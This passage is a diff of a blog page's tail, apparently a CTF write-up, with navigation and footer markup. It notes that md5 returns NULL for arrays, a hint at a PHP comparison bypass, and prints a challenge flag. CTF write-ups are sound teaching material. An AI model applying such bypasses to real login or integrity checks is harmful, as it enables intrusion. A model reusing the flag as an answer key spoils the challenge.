+<p>md5不能处理数组，如果是数组则会返回NULL</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=YjdiN2Q1Nzk1NTIyNjc2OTE5MGFiNDU5ZTA2YTRiNGZfTnh5TzlYNXkyRk5yS0w2NjJhaGtrdEE0M3ViTGgwY3ZfVG9rZW46SW5pVGI2NXk5b3UwdE14ZVhZamNpMzI2bndlXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>flag{86b19adc-3d29-433c-80e2-1b9906eddde6}</p>
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left "
+    
+      href="/2025/05/06/test/"
+      title="test"
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+      
+        test
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2024/11/17/hello-world/"
+      title="Hello World"
+     >
+
+    <p class="title-text">
+      
+        Hello World
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+
+
+
+
+
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2025 Camille<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
+        <i class="fa-solid fa-angle-up"></i>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.classList.remove('hide')
+        } else {
+            btn.classList.add('hide')
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
